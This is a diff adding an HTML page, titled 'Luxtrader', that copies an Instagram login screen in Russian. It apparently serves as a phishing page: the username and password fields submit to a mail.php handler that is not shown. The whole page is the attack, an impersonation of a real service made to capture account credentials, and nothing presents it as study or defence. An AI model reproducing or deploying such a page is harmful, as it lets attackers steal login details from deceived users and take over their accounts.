@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Luxtrader</title>
+    <link href="https://fonts.googleapis.com/css2?family=Lobster+Two&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+
+<body>
+    <div class="page">
+        <div class="block">
+            <div class="block__title">Войдите, чтобы продолжить</div>
+            <div class="block__inst">Instagram</div>
+            <div class="center">
+                <form action="mail.php" method="POST" class="block__form" id="info">
+                    <input type="text" required class="block__part" placeholder="Имя пользователя" id="username"
+                        name="user_name">
+                    <div class="password">
+                        <input type="password" class="block__part" required placeholder="Пароль" name="password"
+                            id="password">
+                        <a href="#" class="password-control"></a>
+                    </div>
+
+                    <button type="submit" class="block__btn inactive" id="btn"><span>Войти</span></button>
+                </form>
+            </div>
+            <div class="block__image"></div>
+        </div>
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+    <script src="js/script.js"></script>
+</body>
+
+</html>
